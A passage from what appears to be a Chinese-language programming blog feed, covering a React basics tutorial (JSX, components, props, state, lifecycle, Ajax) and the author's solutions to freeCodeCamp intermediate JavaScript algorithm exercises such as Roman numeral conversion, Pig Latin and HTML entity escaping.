id=&quot;example&quot;&gt;&lt;/div&gt; &lt;script type=&quot;text/babel&quot;&gt; var names = [&apos;Alice&apos;, &apos;Emily&apos;, &apos;Kate&apos;]; ReactDOM.render( &lt;div&gt; { names.map(function (name, index) { return &lt;div key={index}&gt;Hello, {name}!&lt;/div&gt; }) } &lt;/div&gt;, document.getElementById(&apos;example&apos;) ); &lt;/script&gt; &lt;/body&gt; JSX 的基本语法规则：遇到 HTML 标签（以 &lt;开头），就用 HTML 规则解析；遇到代码块（以{开头），就用 JavaScript 规则解析。上述代码执行结果如下所示。 JSX 允许直接在模板插入 JavaScript 变量。如果这个变量是一个数组，则会展开这个数组的所有成员。 var arr = [ &lt;h1&gt;Hello world!&lt;/h1&gt;, &lt;h2&gt;React is awesome&lt;/h2&gt;, ]; ReactDOM.render( &lt;div&gt;{arr}&lt;/div&gt;, document.getElementById(&apos;example&apos;) ); 上面代码的arr变量是一个数组，结果 JSX 会把它的所有成员，添加到模板，结果如下。 组件React 允许将代码封装成组件（component），然后像插入普通 HTML 标签一样，在网页中插入这个组件。React.createClass() 方法就用于生成一个组件类。 var HelloMessage = React.createClass({ render: function() { return &lt;h1&gt;Hello {this.props.name}&lt;/h1&gt;; } }); ReactDOM.render( &lt;HelloMessage name=&quot;John&quot; /&gt;, document.getElementById(&apos;example&apos;) ); 上述代码中，变量 HelloMessage 就是一个组件类。模板插入 时，会自动生成 HelloMessage 的一个实例（下文的”组件”都指组件类的实例）。所有组件类都必须有自己的 render 方法，用于输出组件。执行结果如下所示。 组件的用法与原生的 HTML 标签完全一致，可以任意加入属性，比如 &lt;HelloMessage name=&quot;John&quot;&gt; ，就是 HelloMessage 组件加入一个 name 属性，值为 John。 组件的属性可以在组件类的 this.props 对象上获取，比如 name 属性就可以通过 this.props.name 读取。 添加组件属性，需要注意，就是 class 属性需要写成 className ，for 属性需要写成 htmlFor ，这是因为 class 和 for 是 JavaScript 的保留字。即在组件类中通过js获取组件的class属性时，需要使用this.props.className。 注意，组件类的第一个字母必须大写，否则会报错，比如HelloMessage不能写成helloMessage。另外，组件类只能包含一个顶层标签，否则也会报错。 var HelloMessage = React.createClass({ render: function() { return &lt;h1&gt; Hello {this.props.name} &lt;/h1&gt;&lt;p&gt; //错误，包含了两个顶层标签，h1和p some text &lt;/p&gt;; } }); 上面代码会报错，因为HelloMessage组件包含了两个顶层标签：h1和p。 this.props.childrenthis.props 对象的属性与组件的属性一一对应，但是有一个例外，就是 this.props.children 属性。它表示组件的所有子节点。 var NotesList = React.createClass({ render: function() { return ( &lt;ol&gt; { React.Children.map(this.props.children, function (child) { return &lt;li&gt;{child}&lt;/li&gt;; }) } &lt;/ol&gt; ); } }); ReactDOM.render( &lt;NotesList&gt; &lt;span&gt;hello&lt;/span&gt; &lt;span&gt;world&lt;/span&gt; &lt;/NotesList&gt;, document.body ); 上面代码的 NoteList 组件有两个 span 子节点，它们都可以通过 this.props.children 读取。执行结果如下所示。 注意， this.props.children 的值有三种可能：如果当前组件没有子节点，它就是 undefined ;如果有一个子节点，数据类型是 object ；如果有多个子节点，数据类型就是 array 。所以，处理 this.props.children 的时候要小心。 React 提供一个工具方法 React.Children 来处理 this.props.children 。我们可以用 React.Children.map 来遍历子节点，而不用担心 this.props.children 的数据类型是 undefined 还是 object。更多的 React.Children 的方法。 PropTypes组件属性组件的属性可以接受任意值，字符串、对象、函数等等都可以。有时，我们需要一种机制，验证别人使用组件时，提供的参数是否符合要求。 组件类的PropTypes属性，就是用来验证组件实例的属性是否符合要求。例如： var MyTitle = React.createClass({ propTypes: { title: React.PropTypes.string.isRequired, }, render: function() { return &lt;h1&gt; {this.props.title} &lt;/h1&gt;; } }); 上述代码中，Mytitle组件类有一个title属性。PropTypes 告诉 React，这个 title 属性是必须的，而且它的值必须是字符串。假如设置title属性的值是number类型就会报错，如下： var data = 123; ReactDOM.render( &lt;MyTitle title={data} /&gt;, document.body ); title属性就通不过验证了。控制台会显示一行警告信息，如下所示： getDefaultProps 方法可以用来设置组件属性的默认值. var MyTitle = React.createClass({ getDefaultProps : function () { return { title : &apos;Hello World&apos; }; }, render: function() { return &lt;h1&gt; {this.props.title} &lt;/h1&gt;; } }); ReactDOM.render( &lt;MyTitle /&gt;, document.body ); 上面代码会输出”Hello World”。 获取真实的DOM节点组件并不是真实的 DOM 节点，而是存在于内存之中的一种数据结构，叫做虚拟 DOM （virtual DOM）。只有当它插入文档以后，才会变成真实的 DOM 。根据 React 的设计，所有的 DOM 变动，都先在虚拟 DOM 上发生，然后再将实际发生变动的部分，反映在真实 DOM上，这种算法叫做 DOM diff ，它可以极大提高网页的性能表现。 但是，有时需要从组件获取真实 DOM 的节点，这时就要用到 ref 属性。 var MyComponent = React.createClass({ handleClick: function() { this.refs.myTextInput.focus(); }, render: function() { return ( &lt;div&gt; &lt;input type=&quot;text&quot; ref=&quot;myTextInput&quot; /&gt; &lt;input type=&quot;button&quot; value=&quot;Focus the text input&quot; onClick={this.handleClick} /&gt; &lt;/div&gt; ); } }); ReactDOM.render( &lt;MyComponent /&gt;, document.getElementById(&apos;example&apos;) ); 上述代码中，组件类 MyComponent 的子节点有一个文本输入框，用于获取用户的输入，这时就必须获取真实的 DOM 节点，虚拟 DOM 是拿不到用户输入的。为此，文本输入框必须有一个 ref 属性，然后 this.refs.[refName] 就会返回这个真实的 DOM 节点。 注意，由于 this.refs.[refName] 属性获取的是真实 DOM ，所以必须等到虚拟 DOM 插入文档以后，才能使用这个属性，否则会报错。上面代码中，通过为组件指定 Click 事件的回调函数 handleClick，确保了只有等到真实 DOM 发生 Click 事件之后，才会读取 this.refs.[refName] 属性。 React 组件支持很多事件，除了 Click 事件以外，还有 KeyDown 、Copy、Scroll 等，完整的事件清单请查看官方文档。 this.state组件免不了要与用户互动，React 的一大创新，就是将组件看成是一个状态机，一开始有一个初始状态，然后用户互动，导致状态变化，从而触发重新渲染 UI 。 var LikeButton = React.createClass({ getInitialState: function() { //初始状态 return {liked: false}; }, handleClick: function(event) { this.setState({liked: !this.state.liked}); }, render: function() { var text = this.state.liked ? &apos;like&apos; : &apos;haven\&apos;t liked&apos;; return ( &lt;p onClick={this.handleClick}&gt; You {text} this. Click to toggle. &lt;/p&gt; ); } }); ReactDOM.render( &lt;LikeButton /&gt;, document.getElementById(&apos;example&apos;) ); 上述组件类的 getInitialState 方法用于定义初始状态，也就是一个对象，这个对象可以通过 this.state 属性读取。 当用户点击组件， 调用Click 事件的回调函数 handleClick，导致状态变化。 this.setState 方法用于修改状态值，每次修改以后，自动调用 this.render 方法，再次渲染组件。 由于 this.props 和 this.state 都用于描述组件的特性，可能会产生混淆。一个简单的区分方法是，this.props 表示那些一旦定义，就不再改变的特性，而 this.state 是会随着用户互动而产生变化的特性。 表单用户在表单填入的内容，属于用户跟组件的互动，所以不能用 this.props 读取。 var Input = React.createClass({ getInitialState: function() { return {value: &apos;Hello!&apos;}; }, handleChange: function(event) { this.setState({value: event.target.value}); }, render: function () { var value = this.state.value; return ( &lt;div&gt; &lt;input type=&quot;text&quot; value={value} onChange={this.handleChange} /&gt; &lt;p&gt;{value}&lt;/p&gt; &lt;/div&gt; ); } }); ReactDOM.render(&lt;Input/&gt;, document.body); 文本输入框的值，不能用 this.props.value 读取，而要定义一个 onChange 事件的回调函数，通过 event.target.value 读取用户输入的值。textarea 元素、select元素、radio元素都属于这种情况。 组件的生命周期组件的生命周期分成三个状态： Mounting：已插入真实 DOM Updating：正在被重新渲染 Unmounting：已移出真实 DOM React 为每个状态都提供了两种处理函数，will 函数在进入状态之前调用，did 函数在进入状态之后调用，三种状态共计五种处理函数。 componentWillMount() componentDidMount() componentWillUpdate(object nextProps, object nextState) componentDidUpdate(object prevProps, object prevState) componentWillUnmount() 此外，React 还提供两种特殊状态的处理函数。 componentWillReceiveProps(object nextProps)：已加载组件收到新的参数时调用 shouldComponentUpdate(object nextProps, object nextState)：组件判断是否重新渲染时调用 栗子: var Hello = React.createClass({ getInitialState: function () { return { opacity: 1.0 }; }, componentDidMount: function () { this.timer = setInterval(function () { var opacity = this.state.opacity; opacity -= .05; if (opacity &lt; 0.1) { opacity = 1.0; } this.setState({ opacity: opacity }); }.bind(this), 100); }, render: function () { return ( &lt;div style={{opacity: this.state.opacity}}&gt; Hello {this.props.name} &lt;/div&gt; ); } }); ReactDOM.render( &lt;Hello name=&quot;world&quot;/&gt;, document.body ); 上述代码在Hello组件加载以后，通过 componentDidMount 方法设置一个定时器，每隔100毫秒，就重新设置组件的透明度，从而引发重新渲染。执行结果如下所示： 注意：组件的style属性的设置方式也值得注意，不能写成 style=&quot;opacity:{this.state.opacity};&quot; 要写成 style={{opacity: this.state.opacity}} 这是因为 React 组件样式是一个对象，所以第一重大括号表示这是 JavaScript 语法，第二重大括号表示样式对象。 Ajax组件的数据来源，通常是通过 Ajax 请求从服务器获取，可以使用 componentDidMount 方法设置 Ajax 请求，等到请求成功，再用 this.setState 方法重新渲染 UI。 var UserGist = React.createClass({ getInitialState: function() { return { username: &apos;&apos;, lastGistUrl: &apos;&apos; }; }, componentDidMount: function() { $.get(this.props.source, function(result) { var lastGist = result[0]; if (this.isMounted()) { this.setState({ username: lastGist.owner.login, lastGistUrl: lastGist.html_url }); } }.bind(this)); }, render: function() { return ( &lt;div&gt; {this.state.username}&apos;s last gist is &lt;a href={this.state.lastGistUrl}&gt;here&lt;/a&gt;. &lt;/div&gt; ); } }); ReactDOM.render( &lt;UserGist source=&quot;https://api.github.com/users/octocat/gists&quot; /&gt;, document.body ); 上面代码使用 jQuery 完成 Ajax 请求，这是为了便于说明。React 本身没有任何依赖，完全可以不用jQuery，而使用其他库。 我们甚至可以把一个promise对象传入组件。 ReactDOM.render( &lt;RepoList promise={$.getJSON(&apos;https://api.github.com/search/repositories?q=javascript&amp;sort=stars&apos;)} /&gt;, document.body ); 上面代码从Github的API抓取数据，然后将promise对象作为属性，传给RepoList组件。 如果promise对象正在抓取数据（pending状态），组件显示”正在加载”；如果promise对象报错（rejected状态），组件显示报错信息；如果promise对象抓取数据成功（fulfilled状态），组件显示获取的数据。 var RepoList = React.createClass({ getInitialState: function() { return { loading: true, error: null, data: null}; }, componentDidMount() { this.props.promise.then( value =&gt; this.setState({loading: false, data: value}), error =&gt; this.setState({loading: false, error: error})); }, render: function() { if (this.state.loading) { return &lt;span&gt;Loading...&lt;/span&gt;; } else if (this.state.error !== null) { return &lt;span&gt;Error: {this.state.error.message}&lt;/span&gt;; } else { var repos = this.state.data.items; var repoList = repos.map(function (repo) { return ( &lt;li&gt; &lt;a href={repo.html_url}&gt;{repo.name}&lt;/a&gt; ({repo.stargazers_count} stars) &lt;br/&gt; {repo.description} &lt;/li&gt; ); }); return ( &lt;main&gt; &lt;h1&gt;Most Popular JavaScript Projects in Github&lt;/h1&gt; &lt;ol&gt;{repoList}&lt;/ol&gt; &lt;/main&gt; ); } } });]]></content>
      <categories>
        <category>React</category>
      </categories>
      <tags>
        <tag>React</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[freeCodeCamp JavaScript中级算法编程学习总结]]></title>
    <url>%2F2017%2F11%2F16%2FfreeCodeCamp-%E4%B8%AD%E7%BA%A7%E7%AE%97%E6%B3%95%E7%BC%96%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[几个 freeCodeCamp JS中级算法编程例题的学习总结。 Sum All Numbers in a Range题目：传递给一个包含两个数字的数组。返回这两个数字和它们之间所有数字的和。（最小的数字并非总在最前面。） tips: Math.max() &nbsp;Math.min()&nbsp;Array.reduce() 实现1 function sumAll(arr) { //获取两个数中的最小值 var min = Math.min(arr[0], arr[1]); //获取两个数中的最大值 var max = Math.max(arr[0], arr[1]); //将区间里的整数顺序添加到数组里 var array = []; for (i = min; i &lt; max + 1; i++) { array.push(i); } //利用.reduce()方法累加数组中的元素并返回 var total = array.reduce(function(sum,val) { return sum += val; }); return total; } sumAll([1, 4]); 实现2 function sumAll(arr) { var max = Math.max(arr[0],arr[1]); var min = Math.min(arr[0],arr[1]); var total = 0; //不使用.reduce()方法实现累加，直接使用for循环实现累加 for(var i = min; i &lt; max + 1; i++) { total += i; } return total; } Diff Two Arrays题目：比较两个数组，然后返回一个新数组，该数组的元素为两个给定数组中所有独有的数组元素。换言之，返回两个数组的差异。 tips：Comparison Operators &nbsp;Array.slice() &nbsp; Array.filter() &nbsp; Array.indexOf() &nbsp; Array.concat() 实现1 function diff(arr1, arr2) { var newArr = []; //比较两个数组大小，判断较长的数组中的每个元素是否在短数组中出现过，若没有出现过则.indexOf()方法返回-1 if (arr1.length &gt;= arr2.length) { for (i = 0; i &lt; arr1.length; i++) { if (arr2.indexOf(arr1[i]) === -1) { newArr.push(arr1[i]); } } } for (i = 0; i &lt; arr2.length; i++) { if (arr1.indexOf(arr2[i]) === -1) { newArr.push(arr2[i]); } } return newArr; } //测试，返回4 diff([1, 2, 3, 5], [1, 2, 3, 4, 5]); 实现2 function diff(arr1, arr2) { var newArr = []; var arr3 = []; for (var i=0;i&lt;arr1.length;i++) { if(arr2.indexOf(arr1[i]) === -1) arr3.push(arr1[i]); } var arr4 = []; for (var j=0;j&lt;arr2.length;j++) { if(arr1.indexOf(arr2[j]) === -1) arr4.push(arr2[j]); } newArr = arr3.concat(arr4); return newArr; } 实现1是自己的想法，只用一次for循环即可得到比较结果。实现2是看到部分博主用的方法。 Roman Numeral Converter题目：将给定的数字转换成罗马数字。 tips：Roman Numerals &nbsp; Array.splice() &nbsp; Array.indexOf() &nbsp; Array.join() 实现1 function convert(num) { //只转换小于4000的数字为罗马数字，大于4000的罗马数字上面要加横线，在此暂不考虑转换 if (num &gt;= 4000) { console.log(&quot;please convert a number less than 4000!&quot;); } //将num的各位提取出来，即num = thousands * 1000 + hundreds * 100 + tens * 10 + units; var thousands = Math.floor(num / 1000) ; var hundreds = Math.floor((num % 1000) / 100); var tens = Math.floor((num % 100) / 10); var units = num % 10; var roman = []; //当千位不为0时，将千位转化为罗马数字 while (thousands !== 0) { switch(thousands) { case 1: roman.splice(0, 0, &quot;M&quot;); break; case 2: roman.splice(0, 0, &quot;M&quot;,&quot;M&quot;); break; case 3: roman.splice(0, 0, &quot;M&quot;, &quot;M&quot;, &quot;M&quot;); break; } thousands = 0; } // 当百位不为0时，将百位转化为罗马数字 while (hundreds !== 0) { // 记录最后一个千位罗马数字索引加一 var lastIdxT = roman.length; switch(hundreds) { case 1: roman.splice(lastIdxT, 0, &quot;C&quot;); break; case 2: roman.splice(lastIdxT, 0, &quot;C&quot;, &quot;C&quot;); break; case 3: roman.splice(lastIdxT, 0, &quot;C&quot;, &quot;C&quot;, &quot;C&quot;); break; case 4: roman.splice(lastIdxT, 0, &quot;C&quot;, &quot;D&quot;); break; case 5: roman.splice(lastIdxT, 0, &quot;D&quot;); break; case 6: roman.splice(lastIdxT, 0, &quot;D&quot;, &quot;C&quot;); break; case 7: roman.splice(lastIdxT, 0, &quot;D&quot;, &quot;C&quot;, &quot;C&quot;); break; case 8: roman.splice(lastIdxT, 0, &quot;D&quot;, &quot;C&quot;, &quot;C&quot;, &quot;C&quot;); break; case 9: roman.splice(lastIdxT, 0, &quot;C&quot;, &quot;M&quot;); break; } hundreds = 0; } // 当十位不为0时，将十位转化为罗马数字 while(tens !== 0) { // 记录最后一个百位罗马数字索引加一 var lastIdxH = roman.length; switch(tens) { case 1: roman.splice(lastIdxH, 0, &quot;X&quot;); break; case 2: roman.splice(lastIdxH, 0, &quot;X&quot;, &quot;X&quot;); break; case 3: roman.splice(lastIdxH, 0, &quot;X&quot;, &quot;X&quot;, &quot;X&quot;); break; case 4: roman.splice(lastIdxH, 0, &quot;X&quot;, &quot;L&quot;); break; case 5: roman.splice(lastIdxH, 0, &quot;L&quot;); break; case 6: roman.splice(lastIdxH, 0, &quot;L&quot;, &quot;X&quot;); break; case 7: roman.splice(lastIdxH, 0, &quot;L&quot;, &quot;X&quot;, &quot;X&quot;); break; case 8: roman.splice(lastIdxH, 0, &quot;L&quot;, &quot;X&quot;, &quot;X&quot;, &quot;X&quot;); break; case 9: roman.splice(lastIdxH, 0, &quot;X&quot;, &quot;C&quot;); break; } tens = 0; } // 记录最后一个十位罗马数字索引加一 var lastIdxTen = roman.length; switch(units) { case 1: roman.splice(lastIdxTen, 0, &quot;I&quot;); break; case 2: roman.splice(lastIdxTen, 0, &quot;I&quot;, &quot;I&quot;); break; case 3: roman.splice(lastIdxTen, 0, &quot;I&quot;, &quot;I&quot;, &quot;I&quot;); break; case 4: roman.splice(lastIdxTen, 0, &quot;I&quot;, &quot;V&quot;); break; case 5: roman.splice(lastIdxTen, 0, &quot;V&quot;); break; case 6: roman.splice(lastIdxTen, 0, &quot;V&quot;, &quot;I&quot;); break; case 7: roman.splice(lastIdxTen, 0, &quot;V&quot;, &quot;I&quot;, &quot;I&quot;); break; case 8: roman.splice(lastIdxTen, 0, &quot;V&quot;, &quot;I&quot;, &quot;I&quot;, &quot;I&quot;); break; case 9: roman.splice(lastIdxTen, 0, &quot;I&quot;, &quot;X&quot;); break; } return roman.join(&quot;&quot;); } convert(36); 实现2 function convert(num) { //将分割数和对应的罗马字符分别存入两个数组 var nums = [1000,900,500,400,100,90,50,40,10,9,5,4,1]; var romans =[&quot;m&quot;,&quot;cm&quot;,&quot;d&quot;,&quot;cd&quot;,&quot;c&quot;,&quot;xc&quot;,&quot;l&quot;,&quot;xl&quot;,&quot;x&quot;,&quot;ix&quot;,&quot;v&quot;,&quot;iv&quot;,&quot;i&quot;]; var str = &quot;&quot;; nums.forEach(function(item,index,array){ while(num &gt;= item){ str += romans[index]; num -= item; } }); return str.toUpperCase(); } convert(36); 实现2是来自一位博主将给定的数字转换为罗马数字，代码精简易懂，自己的实现看起来冗长幼稚，需要学习的还很多哇！ Where art thou题目：写一个 function，它遍历一个对象数组（第一个参数）并返回一个包含相匹配的属性-值对（第二个参数）的所有对象的数组。如果返回的数组中包含 source 对象的属性-值对，那么此对象的每一个属性-值对都必须存在于 collection 的对象中。 例如，如果第一个参数是 [{ first: &quot;Romeo&quot;, last: &quot;Montague&quot; }, { first: &quot;Mercutio&quot;, last: null }, { first: &quot;Tybalt&quot;, last: &quot;Capulet&quot; }]，第二个参数是 { last: &quot;Capulet&quot; }，那么你必须从数组（第一个参数）返回其中的第三个对象，因为它包含了作为第二个参数传递的属性-值对。 tips：Global Object&nbsp; Object.hasOwnProperty() &nbsp; Object.keys()&nbsp; Array.prototype.filter() 实现 function where(collection, source) { var arr = []; //获取source对象的所有属性名并保存在数组keys中 var keys = Object.keys(source); //filter() 方法创建一个新数组, 其包含通过所提供函数测试的所有元素,callback用来测试数组的每个元素，返回true则保留该元素 arr = collection.filter(function(element) { for(var i = 0; i &lt; keys.length; i++) { if(!element.hasOwnProperty(keys[i]) || element[keys[i]] !== source[keys[i]]) return false; } return true; }); return arr; } //返回 [{ first: &quot;Tybalt&quot;, last: &quot;Capulet&quot; }] where([{ first: &quot;Romeo&quot;, last: &quot;Montague&quot; }, { first: &quot;Mercutio&quot;, last: null }, { first: &quot;Tybalt&quot;, last: &quot;Capulet&quot; }], { last: &quot;Capulet&quot; }); Search and Replace题目：使用给定的参数对句子执行一次查找和替换，然后返回新句子。 第一个参数是将要对其执行查找和替换的句子。 第二个参数是将被替换掉的单词（替换前的单词）。 第三个参数用于替换第二个参数（替换后的单词）。 注意：替换时保持原单词的大小写。例如，如果你想用单词 “dog” 替换单词 “Book” ，你应该替换成 “Dog”。 tips：Array.splice() String.replace() Array.join() 实现 function myReplace(str, before, after) { //获取需被替换的单词before的首字母的位置index，indexOf()方法可返回某个指定的字符串值在字符串中首次出现的位置。 var index = str.indexOf(before); //判断before首字母是否为大写，若为大写，则让after首字母也大写 if(str[index]===str[index].toUpperCase()){ after = after[0].toUpperCase() + after.substring(1); //也可以用slice(1) } //替换，stringObject.replace(regexp/substr,replacement) return str.replace(before, after); } /*** 判断字母是否为大写 function isUpperCase(ch){ return ch &gt;= &apos;A&apos; &amp;&amp; ch &lt;= &apos;Z&apos;; } 判断字母是否为小写 function isLowerCase(ch){ return ch &gt;= &apos;a&apos; &amp;&amp; ch &lt;= &apos;z&apos;; } 将单词的首字母大写 function firstUpperCase(str) { var afterStr = str.toLowerCase().replace(/^\w/g,function(s){return s.toUpperCase();}); return afterStr; } ***/ // charAt()方法可返回字符串指定位置的字符，stringObject.charAt(index) myReplace(&quot;A quick brown fox jumped over the lazy dog&quot;, &quot;jumped&quot;, &quot;leaped&quot;); Pig Latin题目：把指定的字符串翻译成 pig latin。 Pig Latin 把一个英文单词的第一个辅音或辅音丛（consonant cluster）移到词尾，然后加上后缀 “ay”。 如果单词以元音开始，你只需要在词尾添加 “way” 就可以了。 tips：Array.indexOf() Array.push() Array.join() String.substr() String.split() 实现1 function translate(str) { // 元音 var vowel = [&apos;a&apos;, &apos;e&apos;, &apos;i&apos;, &apos;o&apos;, &apos;u&apos;]; // 如果单词首字母以元音开头，直接在单词后面加&apos;way&apos; if(vowel.indexOf(str.substr(0,1)) !== -1) { return str + &quot;way&quot;; } /*** 只要单词是以辅音或辅音丛开始，将该辅音移到后面，最后加&apos;ay&apos;。 while循环每次都检查移动辅音后的单词，移动一个辅音字母后若还不是元音字母，继续移动，移完后再加&quot;ay&quot;***/ while(vowel.indexOf(str.substr(0,1)) == -1) { str = str.substr(1) + str.substr(0,1); } return str + &quot;ay&quot;; } translate(&quot;glove&quot;);//测试数据&quot;california&quot;，&quot;paragraphs&quot;，&quot;algorithm&quot;，&quot;eight&quot; 实现2 function translate(str) { var tempArr = []; var answer; tempArr = str.split(&apos;&apos;);//将str分解为单个字符存入数组 var i = 0; //如果首个字符不是元音则 i++，如果首个字符是元音则退出while循环 while (tempArr[i] != &apos;a&apos; &amp;&amp; tempArr[i] != &apos;o&apos; &amp;&amp; tempArr[i] != &apos;i&apos; &amp;&amp; tempArr[i] != &apos;e&apos; &amp;&amp; tempArr[i] != &apos;u&apos;) { i++; } answer = str.substr(i);//将str辅音或辅音丛后面的部分提取出来 answer += str.substr(0,i);//再将辅音或辅音丛部分追加在answer后 //i=0时，首字母为元音，在变换之后加&quot;way&quot; if(i === 0) { answer += &quot;way&quot;; } //i不为0时，首字母为辅音或辅音丛，在变换后加&quot;ay&quot; else { answer += &quot;ay&quot;; } return answer; } DNA Pairing题目：DNA 链缺少配对的碱基。依据每一个碱基，为其找到配对的碱基，然后将结果作为第二个数组返回。 Base pairs（碱基对） 是一对 AT 和 CG，为给定的字母匹配缺失的碱基。 在每一个数组中将给定的字母作为第一个碱基返回。字母和与之配对的字母在一个数组内，然后所有数组再被组织起来封装进一个数组。例如，对于输入的 GCG，相应地返回 [[“G”, “C”], [“C”,”G”],[“G”, “C”]] tips：Array.push() String.split() 实现1 function pair(str) { var inputArr = []; var resultArr = []; //将输入字符串按单个字母拆分为数组 inputArr = str.split(&apos;&apos;); //对输入数组的每一种情况配对，GC,CG,AT,TA inputArr.forEach(function(item, index) { switch(item) { case &quot;G&quot;: resultArr.push([&quot;G&quot;,&quot;C&quot;]); break; case &quot;C&quot;: resultArr.push([&quot;C&quot;,&quot;G&quot;]); break; case &quot;A&quot;: resultArr.push([&quot;A&quot;,&quot;T&quot;]); break; case &quot;T&quot;: resultArr.push([&quot;T&quot;,&quot;A&quot;]); break; } }); return resultArr; } pair(&quot;GCG&quot;);//返回 [[&quot;G&quot;, &quot;C&quot;], [&quot;C&quot;,&quot;G&quot;],[&quot;G&quot;, &quot;C&quot;]] 实现2和实现3来自博客。 实现2 解题思路：把字符串进行匹配和对应关系进行匹配，将匹配到的字符推入该数组。最后将所有的数组推入一个新的数组。 匹配方式：用对象存储对应关系。 function pair(str) { var obj = {&apos;A&apos;:&apos;T&apos;,&apos;T&apos;:&apos;A&apos;,&apos;G&apos;:&apos;C&apos;,&apos;C&apos;:&apos;G&apos;}; var arr = []; for(var i in str){ arr.push([str[i],obj[str[i]]]); } return arr; } pair(&quot;GCG&quot;); 实现3 用map函数来进行优化,其实就是简化了写法。map函数可以改变原有的数组，给予指定的方法就可以了。 function pair(str) { var obj = {&apos;A&apos;:&apos;T&apos;,&apos;T&apos;:&apos;A&apos;,&apos;G&apos;:&apos;C&apos;,&apos;C&apos;:&apos;G&apos;}; //ES6 的写法 return str.split(&apos;&apos;).map(e =&gt; [e,obj[e]]); } pair(&quot;GCG&quot;); ES5 的写法 function pair(str) { var obj = {&apos;A&apos;:&apos;T&apos;,&apos;T&apos;:&apos;A&apos;,&apos;G&apos;:&apos;C&apos;,&apos;C&apos;:&apos;G&apos;}; return str.split(&apos;&apos;).map(function(e){ return [e,obj[e]]; }); } pair(&quot;GCG&quot;); Missing letters题目：从传递进来的字母序列中找到缺失的字母并返回它。如果所有字母都在序列中，返回 undefined。 tips：String.charCodeAt() String.fromCharCode() 实现 function fearNotLetter(str) { var resultStr = &quot;&quot;; //先判断所有字母是否都在序列中,若都在则返回undefined if((str.charCodeAt(0) + str.length - 1) === str.charCodeAt(str.length - 1) ) { return undefined; } else { //若不然，则根据str每个字母的编码是否连续来返回缺失字母 for (i = 0; i &lt; str.length - 1; i++) { var startCode = str.charCodeAt(i); var nextCode = str.charCodeAt(i + 1); //如果相邻两个字母之间的编码不连续，则将两个字母之间缺失的字母追加到resultStr中 while ( nextCode - startCode !== 1) { resultStr += String.fromCharCode(startCode + 1); startCode ++; } } } return resultStr; } fearNotLetter(&quot;abce&quot;);//返回&quot;d&quot; fearNotLetter(&quot;abch&quot;);//返回&quot;defg&quot; 关于此题目的回答，比较了一些博主的答案，他们的答案大多只满足两个输入相邻字母之间只缺少一个字母的情况，对于缺失多个字母的情况没有考虑。自己的回答考虑到了两个相邻字母之间缺失多个字母的情况。 Boo who题目：检查一个值是否是基本布尔类型，并返回 true 或 false。基本布尔类型即 true 和 false。 tips:Boolean Objects 补充：5种简单数据类型（基本数据类型）：Undefined、Null、Boolean、Number、String。 1种复杂数据类型Object（包括Function、Array、Date等）。 typeof操作符返回下列某个字符串： &quot;undefined&quot;---未定义 &quot;boolean&quot;---布尔值 &quot;string&quot;---字符串 &quot;number&quot;---数值 &quot;object&quot;---对象或null &quot;function&quot;---函数 实现 function boo(bool) { //使用typeof操作符检测数据类型 return typeof(bool) === &quot;boolean&quot; ? true : false;//可直接写为 return typeof bool===&apos;boolean&apos;; } boo(null);//返回false Sorted Union题目：写一个 function，传入两个或两个以上的数组，返回一个以给定的原始数组排序的但不包含重复值的新数组。 换句话说，新数组中的所有值都应该以原始顺序被包含在内，但是不包含重复值。即非重复的数字应该以它们原始的顺序排序。例如unite([1, 3, 2], [5, 2, 1, 4], [2, 1]) 应该返回 [1, 3, 2, 5, 4]。unite([1, 3, 2], [1, [5]], [2, [4]]) 应该返回 [1, 3, 2, [5], [4]]。 tips:Arguments object Array.reduce() 实现1 function unite(arr1, arr2, arr3) { //unite函数的输入参数类对象数组arguments for(i = 1; i &lt; arguments.length; i ++) { for (j = 0; j &lt; arguments[i].length; j ++) { //若第i个输入数组的第j个数字在第一个数组中没出现过，则追加到第一个数组中，否则什么也不做 if (arr1.indexOf(arguments[i][j]) == -1) { arr1.push(arguments[i][j]); } } } return arr1; } unite([1, 3, 2], [5, 2, 1, 4], [2, 1]);//返回[1,3,2,5,4] 实现2 思路：先将多个输入参数（数组）合并，再去重。来源于简书。 function unite(arr1, arr2, arr3) { //Array.from() 方法从一个类似数组或可迭代对象中创建一个新的数组实例，即返回[arr1, arr2, arr3]的形式 var args = Array.from(arguments); //reduce() 方法对累加器和数组中的每个元素（从左到右）应用一个函数，将其减少为单个值。 var arr = args.reduce(function(accumulator,cur){ //将多个输入数组合并为一个数组arr,即返回[1,3,2,5,2,1,4,2,1]的形式 return accumulator.concat(cur); }); var resultArr = []; //对合并后的数组arr去重 return resultArr = arr.filter(function(item,index){ //返回true则filter到结果数组，indexOf()方法返回第一个匹配元素的index， //后面重复元素的indexOf返回值为该元素第一次出现时的index（比如对第二个2应用indexOf返回2） return arr.indexOf(item) === index; }); } Convert HTML Entities题目：将字符串中的字符 &amp;、&lt;、&gt;、” （双引号）, 以及 ‘ （单引号）转换为它们对应的 HTML 实体。 tips:RegExp HTML Entities 实现 function convert(str) { //替换规则映射对象 var entityMap = { &apos;&amp;&apos; : &apos;&amp;amp;&apos;, &apos;&lt;&apos; : &apos;&amp;lt;&apos;, &apos;&gt;&apos; : &apos;&amp;gt;&apos;, &apos;\&quot;&apos; : &apos;&amp;quot;&apos;, &apos;\&apos;&apos; : &apos;&amp;apos;&apos; , }; //使用string的replace规则，将匹配到的字符根据替换规则替换掉 return str.replace(/[&amp;&lt;&gt;&quot;&apos;]/g, function(matched) { return entityMap[matched]; }); } convert(&quot;Dolce &amp; Gabbana&quot;);//输出结果&quot;Dolce &amp;amp; Gabbana&quot; Spinal Tap Case题目：将字符串转换为 spinal case。Spinal case 是 all-lowercase-words-joined-by-dashes 这种形式的，也就是以连字符连接所有小写单词。 tips:RegExp String.replace() 实现 function spinalCase(str) { //将str分为两类，一类是以空格、下划线、短横线连接的字符串；一类是驼峰形式的字符串 //驼峰形式的字符串 if(str.split(/\W|_/).length === 1) { for (i = 0; i &lt; str.length; i++) { //找到所有单词的首写大写字母，并用短横线和对应小写替换 if (str[i].toUpperCase() === str[i]) { str = str.replace(str[i], &quot;-&quot;+str[i].toLowerCase()); } } } //以空格、下划线、短横线连接的字符串，先转换为小写再替换 else { //注意匹配模式加上全局标志，否则只会找到第一个匹配 str = str.toLowerCase().replace(/\W|_/g, &quot;-&quot;); } return str; } spinalCase(&apos;This Is Spinal Tap&apos;);//返回 &quot;this-is-spinal-tap&quot; spinalCase(&quot;The_Andy_Griffith_Show&quot;);//返回 &quot;the-andy-griffith-show&quot; spinalCase(&quot;Teletubbies say 